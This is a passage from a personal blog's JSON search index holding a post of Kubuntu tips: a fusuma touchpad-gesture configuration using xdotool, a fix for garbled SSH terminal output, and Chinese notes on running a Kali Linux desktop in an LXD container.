ctrl+shift+t\u0026#39; down: command: \u0026#39;xdotool key ctrl+w\u0026#39; keypress: LEFTSHIFT: command: \u0026#39;xdotool key --clearmodifiers ctrl+d\u0026#39; 4: left: command: \u0026#39;xdotool key super+shift+Tab\u0026#39; right: command: \u0026#39;xdotool key super+Tab\u0026#39; up: command: \u0026#39;xdotool key super+a\u0026#39; down: command: \u0026#39;xdotool key super+a\u0026#39; tap: 4: command: \u0026#39;xdotool key alt+Tab\u0026#39; pinch: 2: in: command: \u0026#34;xdotool key ctrl+alt+a\u0026#34; out: command: \u0026#34;xdotool key ctrl+alt+a\u0026#34; plugin: inputs: libinput_command_input: enable-tap: true verbose: true threshold: swipe: 0.5 pinch: 0.9 interval: swipe: 0.5 pinch: 0.5 开机自启\niberianpig/fusuma\nubuntu连接ssh后点击或者滚动鼠标都会出现乱码 SSH终端鼠标点击滚动出现乱码字符\n输入reset回车即可\nkubuntu通过lxd安装kali桌面版虚拟机 安装dbus-x11,否则会打不开xfce4-panel\nsudo apt-get install dbus-x11 .bashrc 添加\nexport DISPLAY=:0 cd ~ export $(dbus-launch) 宿主机直接运行即可 lxc exec gkali -- sudo -u kali -i xfce4-panel\nKali Linux LXC/LXD Images | Kali Linux Documentation\ndevhackrahul/Kali-Linux-LXD\nLIBDBUSMENU-GLIB-WARNING **: Unable to get session bus: Failed to execute child process \u0026quot;dbus-launch\u0026quot; (No such file or directory) while x-forwarding\n","date":"2021-05-13T22:16:07+08:00","image":"https://fragrant1001.github.io/post/2023/kubuntutricks/cover_hu0b79aa1e895ef877fa3ad2d21285149d_888676_120x120_fill_q75_box_smart1.jpg","permalink":"https://fragrant1001.github.io/post/2023/kubuntutricks/","title":"Kubuntu"}]